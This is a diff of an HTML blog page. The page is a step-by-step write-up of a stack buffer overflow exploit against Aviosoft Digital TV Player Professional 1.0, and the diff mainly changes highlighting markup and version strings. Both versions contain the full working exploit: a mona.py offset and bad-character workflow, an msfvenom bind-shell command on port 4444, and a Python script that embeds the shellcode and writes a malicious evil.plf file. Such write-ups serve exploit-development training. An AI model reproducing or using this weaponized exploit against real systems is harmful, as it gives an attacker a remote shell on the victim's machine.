@@ -12,7 +12,7 @@
   
   <meta itemprop="keywords" content="exploitation, seh, overflow, exploit" />
   
-    <meta itemprop="wordCount" content="483">
+    <meta itemprop="wordCount" content="441">
   
 
   <meta property="og:title" content="Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow" />
@@ -38,7 +38,8 @@
   
   
 
-  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  
+
   <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
   <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
 
@@ -50,7 +51,7 @@
   
   <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
 
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.37.1" />
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
   
   
@@ -145,15 +146,13 @@
 
 <p>After some fuzzing the basic exploit can be create with the following python code.</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="lineno">1 </span><span class="ch">#!/usr/bin/python -w</span>
-<span class="lineno">2 </span>
-<span class="lineno">3 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2000</span>
-<span class="lineno">4 </span>
-<span class="lineno">5 </span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;evil.plf&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
-<span class="lineno">6 </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
-<span class="lineno">7 </span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln">1</span><span class="ch">#!/usr/bin/python -w</span>
+<span class="ln">2</span>
+<span class="ln">3</span><span class="nb">buffer</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2000</span>
+<span class="ln">4</span>
+<span class="ln">5</span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;evil.plf&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;w&#34;</span><span class="p">)</span>
+<span class="ln">6</span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="ln">7</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
 
 <p>Opening this file with the vulnerable application results in an access violation with the following register values.</p>
 
@@ -173,9 +172,7 @@
 
 <p>In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona pc 2000</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona pc 2000</code></pre></div>
 
 <p>Mona.py creates a unique pattern that has to be opened by the application.
 At the time of the access violation the following register values are presented.</p>
@@ -192,9 +189,7 @@ At the time of the access violation the following register values are presented.
 
 <p>Again, mona.py can help us to identify the correct offset of the overflow.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona findmsp</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona findmsp</code></pre></div>
 
 <p>This command does all the magic.
 The output is depicted in the following screenshot.</p>
@@ -211,10 +206,8 @@ The output is depicted in the following screenshot.</p>
 
 <p>We can also check the offset manually.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona pattern_offset 37694136</span>
-<span class="go"> - Pattern 6Ai7 (0x37694136) found in cyclic pattern at position 260</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona pattern_offset 37694136
+ - Pattern 6Ai7 (0x37694136) found in cyclic pattern at position 260</code></pre></div>
 
 <p>Now we know, that we can overwrite the EIP after 260 bytes.
 After updating the initial script, we can now exactly overwrite EIP.</p>
@@ -234,9 +227,7 @@ After updating the initial script, we can now exactly overwrite EIP.</p>
 <p>Luckily, ESP points to the bytes after the BBBB.
 So let&rsquo;s identify a location that stores a suiteable JMP ESP.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona jmp -r esp</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona jmp -r esp</code></pre></div>
 
 <p>Mona.py can list all suitable JMP instructions.</p>
 
@@ -257,9 +248,7 @@ So let&rsquo;s identify a location that stores a suiteable JMP ESP.</p>
 <p>Next, we need to verify the valid charset for the exploit.
 Let&rsquo;s create a byte pattern and compare it against loaded data.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona bytearray -b &#39;\x00&#39;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona bytearray -b &#39;\x00&#39;</code></pre></div>
 
 <p>The bad characters \x0A was identified at 0x0012f489.</p>
 
@@ -275,67 +264,61 @@ Let&rsquo;s create a byte pattern and compare it against loaded data.</p>
 
 <p>Iterating the previous steps until finally, all bad characters have been identified.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">!mona compare -f c:\logs\DVDXPlayer\bytearray.bin</span>
-<span class="go">[+] Comparing with memory at location : 0x0012f480 (Stack)</span>
-<span class="go">!!! Hooray, normal shellcode unmodified !!!</span>
-<span class="go">Bytes omitted from input: 00 0a 1a</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">!mona compare -f c:\logs\DVDXPlayer\bytearray.bin
+[+] Comparing with memory at location : 0x0012f480 (Stack)
+!!! Hooray, normal shellcode unmodified !!!
+Bytes omitted from input: 00 0a 1a</code></pre></div>
 
 <h1 id="adding-shellcode">Adding Shellcode</h1>
 
 <p>Finally, let&rsquo;s add a custom payload to the exploit code.
 With metasploit, we can just do that and update the python PoC.</p>
 
-<div class="highlight"><pre><code class="language-console" data-lang="console"><span></span><span class="go">msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39;</code></pre></div>
 
 <h1 id="the-exploit">The Exploit</h1>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="lineno"> 1 </span><span class="ch">#!/usr/bin/python -w</span>
-<span class="lineno"> 2 </span>
-<span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
-<span class="lineno"> 4 </span>
-<span class="lineno"> 5 </span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
-<span class="lineno"> 6 </span><span class="c1"># msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39; #</span>
-<span class="lineno"> 7 </span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
-<span class="lineno"> 8 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1</span><span class="s2">&quot;</span>
-<span class="lineno"> 9 </span><span class="s2">&quot;</span><span class="se">\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b</span><span class="s2">&quot;</span>
-<span class="lineno">10 </span><span class="s2">&quot;</span><span class="se">\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87</span><span class="s2">&quot;</span>
-<span class="lineno">11 </span><span class="s2">&quot;</span><span class="se">\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d</span><span class="s2">&quot;</span>
-<span class="lineno">12 </span><span class="s2">&quot;</span><span class="se">\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5</span><span class="s2">&quot;</span>
-<span class="lineno">13 </span><span class="s2">&quot;</span><span class="se">\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02</span><span class="s2">&quot;</span>
-<span class="lineno">14 </span><span class="s2">&quot;</span><span class="se">\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6</span><span class="s2">&quot;</span>
-<span class="lineno">15 </span><span class="s2">&quot;</span><span class="se">\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b</span><span class="s2">&quot;</span>
-<span class="lineno">16 </span><span class="s2">&quot;</span><span class="se">\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3</span><span class="s2">&quot;</span>
-<span class="lineno">17 </span><span class="s2">&quot;</span><span class="se">\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e</span><span class="s2">&quot;</span>
-<span class="lineno">18 </span><span class="s2">&quot;</span><span class="se">\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e</span><span class="s2">&quot;</span>
-<span class="lineno">19 </span><span class="s2">&quot;</span><span class="se">\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5</span><span class="s2">&quot;</span>
-<span class="lineno">20 </span><span class="s2">&quot;</span><span class="se">\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f</span><span class="s2">&quot;</span>
-<span class="lineno">21 </span><span class="s2">&quot;</span><span class="se">\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81</span><span class="s2">&quot;</span>
-<span class="lineno">22 </span><span class="s2">&quot;</span><span class="se">\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11</span><span class="s2">&quot;</span>
-<span class="lineno">23 </span><span class="s2">&quot;</span><span class="se">\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4</span><span class="s2">&quot;</span>
-<span class="lineno">24 </span><span class="s2">&quot;</span><span class="se">\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7</span><span class="s2">&quot;</span>
-<span class="lineno">25 </span><span class="s2">&quot;</span><span class="se">\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef</span><span class="s2">&quot;</span>
-<span class="lineno">26 </span><span class="s2">&quot;</span><span class="se">\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d</span><span class="s2">&quot;</span>
-<span class="lineno">27 </span><span class="s2">&quot;</span><span class="se">\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3</span><span class="s2">&quot;</span>
-<span class="lineno">28 </span><span class="s2">&quot;</span><span class="se">\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3</span><span class="s2">&quot;</span>
-<span class="lineno">29 </span><span class="s2">&quot;</span><span class="se">\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40</span><span class="s2">&quot;</span>
-<span class="lineno">30 </span><span class="s2">&quot;</span><span class="se">\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6</span><span class="s2">&quot;</span>
-<span class="lineno">31 </span><span class="s2">&quot;</span><span class="se">\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc</span><span class="s2">&quot;</span>
-<span class="lineno">32 </span><span class="s2">&quot;</span><span class="se">\x4f\x23\x27\x29\x6f\x90\x48\x78</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="lineno">33 </span>
-<span class="lineno">34 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">260</span>
-<span class="lineno">35 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt; L&#39;</span><span class="p">,</span> <span class="mh">0x6405c20b</span><span class="p">)</span> <span class="c1">#jmp esp [MediaPlayerCtrl.dll]</span>
-<span class="lineno">36 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
-<span class="lineno">37 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
-<span class="lineno">38 </span>
-<span class="lineno">39 </span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;evil.plf&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">)</span>
-<span class="lineno">40 </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
-<span class="lineno">41 </span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="ch">#!/usr/bin/python -w</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span><span class="kn">import</span> <span class="nn">struct</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="ln"> 6</span><span class="c1"># msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39; #</span>
+<span class="ln"> 7</span><span class="c1">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="ln"> 8</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1</span><span class="s2">&#34;</span>
+<span class="ln"> 9</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b</span><span class="s2">&#34;</span>
+<span class="ln">10</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87</span><span class="s2">&#34;</span>
+<span class="ln">11</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d</span><span class="s2">&#34;</span>
+<span class="ln">12</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5</span><span class="s2">&#34;</span>
+<span class="ln">13</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02</span><span class="s2">&#34;</span>
+<span class="ln">14</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6</span><span class="s2">&#34;</span>
+<span class="ln">15</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b</span><span class="s2">&#34;</span>
+<span class="ln">16</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3</span><span class="s2">&#34;</span>
+<span class="ln">17</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e</span><span class="s2">&#34;</span>
+<span class="ln">18</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e</span><span class="s2">&#34;</span>
+<span class="ln">19</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5</span><span class="s2">&#34;</span>
+<span class="ln">20</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f</span><span class="s2">&#34;</span>
+<span class="ln">21</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81</span><span class="s2">&#34;</span>
+<span class="ln">22</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11</span><span class="s2">&#34;</span>
+<span class="ln">23</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4</span><span class="s2">&#34;</span>
+<span class="ln">24</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7</span><span class="s2">&#34;</span>
+<span class="ln">25</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef</span><span class="s2">&#34;</span>
+<span class="ln">26</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d</span><span class="s2">&#34;</span>
+<span class="ln">27</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3</span><span class="s2">&#34;</span>
+<span class="ln">28</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3</span><span class="s2">&#34;</span>
+<span class="ln">29</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40</span><span class="s2">&#34;</span>
+<span class="ln">30</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6</span><span class="s2">&#34;</span>
+<span class="ln">31</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc</span><span class="s2">&#34;</span>
+<span class="ln">32</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x4f\x23\x27\x29\x6f\x90\x48\x78</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="ln">33</span>
+<span class="ln">34</span><span class="nb">buffer</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">260</span>
+<span class="ln">35</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;&lt; L&#39;</span><span class="p">,</span> <span class="mh">0x6405c20b</span><span class="p">)</span> <span class="c1">#jmp esp [MediaPlayerCtrl.dll]</span>
+<span class="ln">36</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="ln">37</span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="ln">38</span>
+<span class="ln">39</span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;evil.plf&#34;</span><span class="p">,</span><span class="sa"></span><span class="s2">&#34;w&#34;</span><span class="p">)</span>
+<span class="ln">40</span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="ln">41</span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
 
 <p>By loading the plf file, the payload is executed.</p>
 
@@ -379,7 +362,7 @@ With metasploit, we can just do that and update the python PoC.</p>
 
 <footer>
 
-  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
 
   
   
